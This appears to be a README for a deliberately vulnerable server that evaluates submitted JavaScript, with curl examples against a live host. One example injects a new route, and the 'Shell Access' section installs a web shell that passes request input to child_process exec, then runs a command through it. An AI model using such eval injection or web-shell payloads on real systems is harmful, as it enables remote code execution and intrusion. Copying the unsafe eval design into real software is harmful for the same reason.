# About

A server that is super vulnerable to attacks. Because why not throw `eval` into it.

# Examples

**Basic**

```
curl -X POST https://eval.nfshost.com/ \
  -H "Content-Type: application/json" \
  -d '{"code": "1 + 1"}'
```

**Add a new route**

```
curl -X POST https://eval.nfshost.com/ \
  -H "Content-Type: application/json" \
  -d '{"code": "app.get(\"/foobar\", (req, res) => res.send(\"woohoo\"))"}'
  ```

**Shell Access**

Gain Access

```
curl -X POST https://eval.nfshost.com/ \
  -H "Content-Type: application/json" \
  -d '{"code": "app.post(\"/shell\", (req, res) => { const { exec } = require(\"child_process\"); exec(req.body.command, (e, o, s) => res.json({ error: e?.message, stdout: o, stderr: s })); });"}'
```

Run a command
```
curl -X POST https://eval.nfshost.com/shell -H "Content-Type: application/json" -d '{"command": "ls -la"}'
```